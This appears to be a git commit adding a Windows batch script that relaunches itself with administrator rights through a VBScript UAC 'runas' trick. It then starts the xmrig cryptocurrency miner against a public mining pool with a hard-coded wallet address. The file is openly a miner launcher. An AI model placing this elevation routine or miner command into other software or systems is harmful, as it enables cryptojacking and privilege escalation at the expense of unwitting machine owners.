a23c57308ac8e5e813dd72ecf650f5a01606f318
Anothermeer <zhenwenmah6@gmail.com>
2024-05-11 15:29:03 +0800

    Add 4 more start script

---
+++ mine_cl.bat
@@ -0,0 +1,36 @@
+@echo off
+cls
+cd /d "%~dp0"
+
+rem    Priviledges grabber by endermanch/matt
+:init
+setlocal DisableDelayedExpansion
+set "batchPath=%~0"
+for %%k in (%0) do set batchName=%%~nk
+set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
+setlocal EnableDelayedExpansion
+
+:checkPrivileges
+NET FILE 1>NUL 2>NUL
+if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
+
+:getPrivileges
+if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
+echo Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
+echo args = "ELEV " >> "%vbsGetPrivileges%"
+echo For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
+echo args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
+echo Next >> "%vbsGetPrivileges%"
+echo UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
+"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
+exit /B
+
+:gotPrivileges
+setlocal & pushd .
+cd /d %~dp0
+if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
+
+xmrig.exe -o pool.hashvault.pro:443 -u 49ms22wR6grVwgcoB9Q2oLTFawCsh6x6uERAnsXVA4v87c17DyxzqwgPuaUZDczZvTihy25yz7grV7EPGAwiGuW2QMRGskE -p RandomPC -k --tls
+pause
+goto exit
+
